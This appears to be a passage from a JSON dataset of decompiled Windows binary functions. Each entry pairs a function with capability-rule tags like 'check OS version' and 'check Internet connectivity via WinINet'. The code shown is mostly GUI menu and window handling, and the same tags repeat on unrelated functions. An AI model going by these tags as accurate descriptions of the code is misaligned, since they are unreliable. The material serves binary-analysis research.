        "decompiled_code": "\nuint __cdecl fcn.004386ac(uint uFlags, uint cchMax, uchar *lpString)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t var_4h;\n    \n    cVar1 = fcn.00437b44();\n    if (cVar1 == '\\0') {\n        uVar4 = sub.user32.dll_GetMenuStringA();\n    }\n    else {\n        var_4h = 0;\n        uVar2 = sub.user32.dll_GetMenuState();\n        if ((uVar2 & 0x10) == 0) {\n            iVar3 = sub.user32.dll_GetMenuItemID();\n            if (iVar3 != -1) {\n                var_4h = fcn.004379c0();\n            }\n        }\n        else {\n            sub.user32.dll_GetSubMenu();\n            var_4h = fcn.004379c0();\n        }\n        if (var_4h == 0) {\n            uVar4 = 0;\n        }\n        else {\n            *lpString = 0;\n            fcn.0040a958();\n            uVar4 = fcn.0040a870();\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 277
    },
    "00438778": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00438778(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x41) != '\\0') {\n        iVar1 = fcn.0044d290();\n        if (iVar1 != 0) {\n            fcn.00438754();\n            *(in_EAX + 0x41) = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "004387a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004387a0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x41) != '\\0') {\n        fcn.00404800();\n        fcn.00438754();\n        *(in_EAX + 0x41) = 1;\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "00438834": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438834(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x38) != 0) {\n        cVar1 = fcn.00438150();\n        if (in_ECX == 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x38), 0xb015, 0, 0);\n        }\n        if (cVar1 != '\\0') {\n            sub.user32.dll_DrawMenuBar(*(in_EAX + 0x38));\n        }\n    }\n    fcn.004382cc(arg_8h & 0xff);\n    return;\n}\n",
        "token_count": 172
    },
    "00438950": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438950(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint32_t uStack104;\n    uint uStack100;\n    uchar *puStack96;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uchar *puStack84;\n    uchar *puStack80;\n    uint32_t uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_dh;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    uStack72 = 0x438e84;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iVar9 = *param_2;\n    if (iVar9 < 0x112) {\n        if (iVar9 == 0x111) {\n            iVar9 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar9 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x4389ce;\n                    fcn.004198b4();\n                    puStack80 = 0x4389d7;\n                    cVar3 = fcn.00437a60();\n                    if (cVar3 != '\\0') goto code_r0x00438e6e;\n                    iVar9 = iVar9 + -1;\n                    puVar2 = puStack68;\n                } while (iVar9 != 0);\n            }\n        }\n        else if (iVar9 == 0x2b) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x438be2;\n                    fcn.004198b4();\n                    puStack80 = 0x438bef;\n                    iVar5 = fcn.004379c0();\n                    if (iVar5 != 0) {\n                        puStack80 = 0x438c08;\n                        fcn.004250b4();\n                        puStack84 = 0x438cb7;\n                        uStack88 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa8;\n                        uStack92 = *(iVar9 + 0x18);\n                        puStack96 = 0x438c25;\n                        puStack80 = &stack0xfffffffc;\n                        uVar6 = sub.gdi32.dll_SaveDC();\n                        uStack100 = 0x438c9a;\n                        uStack104 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff98;\n                        puStack96 = &stack0xfffffffc;\n                        fcn.00425748();\n                        fcn.004255dc();\n                        uVar8 = *(iVar9 + 0x10);\n                        puStack112 = 0x438c72;\n                        fcn.00439148(uVar8);\n                        *in_FS_OFFSET = uVar8;\n                        uStack100 = 0x438ca1;\n                        uStack104 = 0x438c89;\n                        fcn.00425748();\n                        puStack112 = 0x438c99;\n                        uStack104 = uVar6;\n                        sub.gdi32.dll_RestoreDC();\n                        return;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n        else if (iVar9 == 0x2c) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x438ced;\n                    fcn.004198b4();\n                    puStack80 = 0x438cfa;\n                    piVar4 = fcn.004379c0();\n                    if (piVar4 != NULL) {\n                        puStack80 = *(in_EAX + 0x10);\n                        puStack84 = 0x438d13;\n                        uVar6 = sub.user32.dll_GetWindowDC();\n                        uStack88 = 0x438dfa;\n                        uStack92 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa4;\n                        puStack96 = 0x438d30;\n                        puStack84 = &stack0xfffffffc;\n                        fcn.004250b4();\n                        uStack100 = 0x438dd5;\n                        uStack104 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff98;\n                        puStack112 = 0x438d4a;\n                        puStack96 = &stack0xfffffffc;\n                        uVar7 = sub.gdi32.dll_SaveDC();\n                        uStack116 = 0x438db8;\n                        uStack120 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff88;\n                        puStack112 = &stack0xfffffffc;\n                        fcn.00425748();\n                        fcn.004255dc();\n                        uVar8 = iVar9 + 0x10;\n                        (**(*piVar4 + 0x38))();\n                        *in_FS_OFFSET = uVar8;\n                        uStack116 = 0x438dbf;\n                        uStack120 = 0x438daa;\n                        fcn.00425748();\n                        uStack120 = uVar7;\n                        sub.gdi32.dll_RestoreDC(uVar6);\n                        return;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n        else if (iVar9 == 0x53) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x438ae0;\n                    piVar4 = fcn.004198b4();\n                    puStack80 = 0x438ae5;\n                    iVar5 = (**(*piVar4 + 0x34))();\n                    if (iVar5 == *(iVar9 + 0xc)) {\n                        puStack80 = 0x438af7;\n                        iVar5 = fcn.004198b4();\n                        unique0x00007a00 = *(iVar5 + 0x34);\n                    }\n                    else {\n                        puStack80 = 0x438b09;\n                        fcn.004198b4();\n                        puStack80 = 0x438b16;\n                        *NULL = fcn.004379c0();\n                    }\n                    if (stack0xfffffff0 != 0) {\n                        puStack80 = 0x438b2d;\n                        fcn.004198b4();\n                        puStack80 = 0x438b3a;\n                        iVar9 = fcn.004379f0();\n                        if (iVar9 == 0) {\n                            puStack80 = 0x438b48;\n                            fcn.004198b4();\n                            puStack80 = 0x438b55;\n                            fcn.004379f0();\n                        }\n                        if (*(**0x495d00 + 0x6c) != 0) {\n                            if ((*(*(**0x495d00 + 0x6c) + 0x270) & 8) == 0) {\n                                puStack80 = 0x438bae;\n                                fcn.00446ca8();\n                            }\n                            else {\n                                puStack80 = 0x438b9b;\n                                fcn.00446d30();\n                            }\n                        }\n                        goto code_r0x00438e6e;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n    }\n    else if (iVar9 == 0x117) {\n        iVar9 = *(in_EAX + 8);\n        puStack68 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        if (-1 < iVar9 + -1) {\n            do {\n                puStack68 = puVar2;\n                puStack80 = 0x438a04;\n                fcn.004198b4();\n                puStack80 = 0x438a0c;\n                cVar3 = fcn.00437a7c();\n                if (cVar3 != '\\0') goto code_r0x00438e6e;\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n    }\n    else if (iVar9 == 0x11f) {\n        uVar1 = *(param_2 + 6);\n        iVar9 = *(in_EAX + 8);\n        puStack68 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        if (-1 < iVar9 + -1) {\n            do {\n                puStack68 = puVar2;\n                if (((uVar1 & 0x10) != 0) && (param_2[2] != 0)) {\n                    puStack80 = *(param_2 + 1);\n                    uStack88 = 0x438a51;\n                    uStack76 = param_2[2];\n                    sub.user32.dll_GetSubMenu();\n                }\n                puStack80 = 0x438a70;\n                fcn.004198b4();\n                puStack80 = 0x438a7c;\n                iVar10 = fcn.004379c0();\n                if (iVar10 != 0) {\n                    puStack80 = 0x438a93;\n                    fcn.0044d544();\n                    puStack80 = 0x438aa2;\n                    fcn.00447070();\n                    goto code_r0x00438e6e;\n                }\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n        puStack80 = 0x438ab9;\n        fcn.00447070();\n    }\n    else {\n        puStack68 = &stack0xfffffffc;\n        if ((iVar9 == 0x120) &&\n           (iVar9 = *(in_EAX + 8),  puStack68 = &stack0xfffffffc,  puVar2 = &stack0xfffffffc,  -1 < iVar9 + -1)) {\n            do {\n                puStack68 = puVar2;\n                puStack80 = 0x438e23;\n                piVar4 = fcn.004198b4();\n                puStack80 = 0x438e2e;\n                iVar10 = (**(*piVar4 + 0x34))();\n                if (iVar10 == param_2[2]) {\ncode_r0x00438e44:\n                    puStack80 = 0x438e4e;\n                    fcn.00438530();\n                    goto code_r0x00438e6e;\n                }\n                puStack80 = 0x438e40;\n                iVar10 = fcn.004379c0();\n                if (iVar10 != 0) goto code_r0x00438e44;\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n    }\n    puStack80 = param_2[2];\n    puStack84 = param_2[1];\n    uStack88 = *param_2;\n    uStack76 = *(in_EAX + 0x10);\n    puStack96 = 0x438e6b;\n    iVar9 = sub.user32.dll_DefWindowProcA();\n    param_2[3] = iVar9;\ncode_r0x00438e6e:\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x438e8b;\n    uStack72 = 0x438e83;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 2899
    },
    "00438e94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00438e94(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 8) == 0) {\n        uVar1 = fcn.004210ec(fcn.00438904, in_EAX);\n        *(in_EAX + 0x10) = uVar1;\n    }\n    fcn.0041975c();\n    return;\n}\n",
        "token_count": 95
    },
    "00438ebc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00438ebc(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.004199f8();\n    if (*(in_EAX + 8) == 0) {\n        fcn.004211a0();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00438fa4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00438fa4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(*0x495d2c + 0xd) != '\\0') && (*(in_EAX + 0x41) != '\\0')) {\n        iVar1 = fcn.004339f4();\n        if (iVar1 == 0) {\n            fcn.00438754();\n            *(in_EAX + 0x41) = 1;\n        }\n        else {\n            fcn.00438754();\n            *(in_EAX + 0x41) = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "00438ff0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00438ff0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*(*0x495d2c + 0xd) != '\\0') {\n        if (*(in_EAX + 0x41) == '\\0') {\n            uVar2 = *(in_EAX + 0x30) == '\\x01';\n        }\n        else {\n            iVar1 = fcn.004339f4();\n            if (iVar1 == 0) {\n                uVar2 = fcn.00445704();\n            }\n            else {\n                uVar2 = fcn.0040484c();\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 173
    },
    "0043b774": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043b774(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint8_t uStack51;\n    uint8_t uStack50;\n    char cStack40;\n    \n    sub.user32.dll_GetWindowLongA();\n    iVar2 = sub.user32.dll_IsIconic();\n    uVar3 = 1 - (iVar2 == 0);\n    iVar2 = sub.user32.dll_IsWindowVisible();\n    if ((iVar2 == 0) && ((in_EAX != *(*0x49ac1c + 0x30) || (*(*0x49ac1c + 0x5b) == '\\0')))) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    if ((uVar1 | uVar3) != 0) {\n        cStack40 = in_EAX;\n        sub.user32.dll_ShowWindow();\n    }\n    if (cStack40 == '\\0') {\n        sub.user32.dll_SetWindowLongA();\n    }\n    else {\n        sub.user32.dll_SetWindowLongA();\n    }\n    uStack51 = in_EAX >> 8;\n    uStack50 = in_EAX >> 0x10;\n    if (((uStack51 & uStack50) != 0) || (uVar3 != 0)) {\n        if (uVar3 == 0) {\n            sub.user32.dll_ShowWindow();\n        }\n        else {\n            sub.user32.dll_ShowWindow();\n        }\n    }\n    return;\n}\n",
        "token_count": 352
    },
    "0043b834": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043b834(void)\n\n{\n    if (*(*0x49ac1c + 0x30) != 0) {\n        fcn.00445588();\n    }\n    fcn.00446d38();\n    fcn.00420224();\n    fcn.004201c8();\n    return;\n}\n",
        "token_count": 73
    },
    "0043b9b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043b9b8(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h != *0x493514) && (arg_8h != *(*0x49ac1c + 0x30))) {\n        iVar1 = sub.user32.dll_IsWindowVisible(arg_8h);\n        if (iVar1 != 0) {\n            iVar1 = sub.user32.dll_IsWindowEnabled(arg_8h);\n            if (iVar1 != 0) {\n                uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xffffffec);\n                if ((uVar2 & 8) == 0) {\n                    if (*0x493518 == 0) {\n                        *0x493518 = arg_8h;\n                    }\n                }\n                else if (*0x49351c == 0) {\n                    *0x49351c = arg_8h;\n                }\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 233
    },
    "0043ba1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043ba1c(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    *0x493518 = 0;\n    *0x49351c = 0;\n    *0x493514 = in_EAX;\n    uVar1 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0043b9b8, 0);\n    sub.user32.dll_EnumThreadWindows(uVar1);\n    if (*0x493518 != 0) {\n        return *0x493518;\n    }\n    return *0x49351c;\n}\n",
        "token_count": 132
    },
    "0043bce8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043bce8(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    do {\n        if (param_2 == '\\0') {\n            cVar1 = fcn.004047dc();\n            if (cVar1 != '\\0') {\ncode_r0x0043bd0e:\n                cVar1 = fcn.004047dc();\n                if (cVar1 != '\\0') {\n                    return in_EAX;\n                }\n                return 0;\n            }\n        }\n        if (*(in_EAX + 0x30) == 0) goto code_r0x0043bd0e;\n        in_EAX = *(in_EAX + 0x30);\n    } while( true );\n}\n",
        "token_count": 176
    },
    "0043bea0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043bea0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x18) == '\\0') {\n        cVar1 = fcn.0043c060();\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.00450f34();\n            if (cVar1 == '\\0') {\n                fcn.0043c5b8();\n            }\n            else {\n                fcn.0043c5b8();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "0043bed8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043bed8(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x57) != '\\0') {\n        cVar1 = *(in_EAX + 0x5b);\n        if ((cVar1 == '\\0') || (cVar1 == '\\x03')) {\n            if ((*(in_EAX + 0x5b) == '\\x03') || (*0x43bf44 == (*0x43bf40 & *(in_EAX + 0x61)))) {\n                iVar3 = *(*(arg_8h + -8) + 0xc) + *(in_EAX + 0x40) + *(in_EAX + 0x48);\n                iVar2 = *(arg_8h + -4);\n                if (*(arg_8h + -4) <= iVar3) {\n                    iVar2 = iVar3;\n                }\n                *(arg_8h + -4) = iVar2;\n            }\n        }\n        else if (cVar1 == '\\x04') {\n            *(arg_8h + -0xc) = *(arg_8h + -0xc) + *(in_EAX + 0x48);\n        }\n    }\n    return;\n}\n",
        "token_count": 299
    },
    "0043bf48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043bf48(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x57) != '\\0') {\n        if (*(in_EAX + 0x5b) < 2) {\n            if ((*(in_EAX + 0x5b) == '\\x01') || (*0x43bfb0 == (*0x43bfac & *(in_EAX + 0x61)))) {\n                iVar2 = *(*(arg_8h + -8) + 0xc) + *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n                iVar1 = *(arg_8h + -4);\n                if (*(arg_8h + -4) <= iVar2) {\n                    iVar1 = iVar2;\n                }\n                *(arg_8h + -4) = iVar1;\n            }\n        }\n        else if (*(in_EAX + 0x5b) == 2) {\n            *(arg_8h + -0xc) = *(arg_8h + -0xc) + *(in_EAX + 0x4c);\n        }\n    }\n    return;\n}\n",
        "token_count": 283
    },
    "0043bfb4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043bfb4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 4) + 0x96) != '\\0') {\n        cVar1 = (**(**(in_EAX + 4) + 0xd8))();\n        if (cVar1 == '\\0') {\n            fcn.0043c6f0();\n        }\n        else {\n            iVar2 = fcn.00454684();\n            if (-1 < iVar2 + -1) {\n                do {\n                    if (*(in_EAX + 0x18) == '\\0') {\n                        puVar3 = &stack0xfffffffc;\n                        fcn.00454648();\n                        fcn.0043bed8(puVar3);\n                    }\n                    else {\n                        puVar3 = &stack0xfffffffc;\n                        fcn.00454648();\n                        fcn.0043bf48(puVar3);\n                    }\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            fcn.0043c6f0();\n        }\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "0043c060": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043c060(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0x100000;\n    if (*(in_EAX + 0x18) == '\\x01') {\n        uVar3 = 0x200000;\n    }\n    if (*(in_EAX + 0x1c) != '\\0') {\n        uVar1 = fcn.00458594(0xfffffff0);\n        uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n        if ((uVar2 & uVar3) != 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 168
    },
    "0043c0cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043c0cc(int32_t arg_8h)\n\n{\n    char cVar1;\n    ushort in_DX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (*(arg_8h + -5) == '\\0') {\n        if ((*(arg_8h + -6) != '\\0') && (cVar1 = fcn.0043c098(arg_8h),  cVar1 == '\\0')) {\n            iVar2 = (***0x495974)(in_DX);\n            return -(iVar2 - *(arg_8h + -0xc));\n        }\n        if ((*(arg_8h + -6) == '\\0') && (cVar1 = fcn.0043c098(arg_8h),  cVar1 != '\\0')) {\n            iVar2 = (***0x495974)(in_DX);\n            iVar2 = iVar2 - *(arg_8h + -0xc);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 224
    },
    "0043c5b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043c5b8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    \n    if ((*(*(in_EAX + 4) + 0x1c) & 2) == 0) {\n        iVar1 = *(in_EAX + 0x14);\n        if ((param_2 <= iVar1) && (iVar1 = param_2,  param_2 < 0)) {\n            iVar1 = 0;\n        }\n        bVar3 = *(in_EAX + 0x18) != '\\0';\n        if (iVar1 != *(in_EAX + 0xc)) {\n            *(in_EAX + 0xc) = iVar1;\n            if (*(in_EAX + 0x18) == '\\0') {\n                fcn.00458140();\n            }\n            else {\n                fcn.00458140();\n            }\n            if ((((*(*(in_EAX + 4) + 0x1c) & 0x10) != 0) && (iVar1 = fcn.0043bd2c(),  iVar1 != 0)) &&\n               (*(iVar1 + 0x298) != 0)) {\n                (**(**(iVar1 + 0x298) + 0xc))();\n            }\n        }\n        uVar2 = fcn.00458594(bVar3);\n        iVar1 = (***0x495bc0)(uVar2);\n        if (iVar1 != *(in_EAX + 0xc)) {\n            uVar2 = fcn.00458594(bVar3, *(in_EAX + 0xc), 0xffffffff);\n            (***0x49592c)(uVar2);\n        }\n    }\n    else {\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 425
    },
    "0043c738": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c738(int32_t arg_8h)\n\n{\n    char in_AL;\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t arg_14h;\n    \n    piVar3 = arg_8h + -4;\n    arg_14h = -(in_AL != '\\0');\n    uVar4 = *(*(*piVar3 + 0x34) * 4 + 0x493560);\n    uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x493538);\n    uVar1 = fcn.00458594();\n    fcn.00431c34(uVar1, uVar2, uVar4, arg_14h);\n    if (0 < *(*piVar3 + 0x24)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x24);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x49353c);\n        uVar1 = fcn.00458594();\n        fcn.00431c34(uVar1, uVar2, uVar4, uVar5);\n    }\n    if (0 < *(*piVar3 + 0x38)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x38);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x493540);\n        uVar1 = fcn.00458594();\n        fcn.00431c34(uVar1, uVar2, uVar4, uVar5);\n    }\n    if (0 < *(*piVar3 + 0x30)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x30);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x493544);\n        uVar1 = fcn.00458594();\n        